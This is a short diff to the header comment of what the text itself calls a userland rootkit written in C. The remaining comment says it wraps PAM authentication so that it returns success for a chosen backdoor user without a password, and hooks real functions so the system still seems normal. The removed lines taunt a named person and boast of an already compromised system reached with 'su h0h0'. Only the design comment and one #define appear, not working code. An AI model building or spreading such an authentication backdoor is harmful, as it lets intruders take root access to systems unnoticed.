@@ -1,13 +1,7 @@
 /*
-    If you are reading this, N, then stop fucking stalking me and leeching off my rep mate.
-    I'm writing a userland rootkit mate, even though I don't root. Cheers.
-
         [*] If not su'ing SU_USER, hook real functions, so they still function normally.
         [*] Gets passwd entry for JACK_USER if su'ing SU_USER (pwd.h contains the passwd struct definition, or see man page)
         [*] Wraps PAM functions handling authentication (found via ltrace) -> returns PAM_SUCCESS for SU_USER/PAM_USER (authenticates without question)
-
-    Will add more shit when I get my pegasus.
-    Already fucked your system mate, just "su h0h0" and -3 get fucked.
 */
 
 #define  _GNU_SOURCE
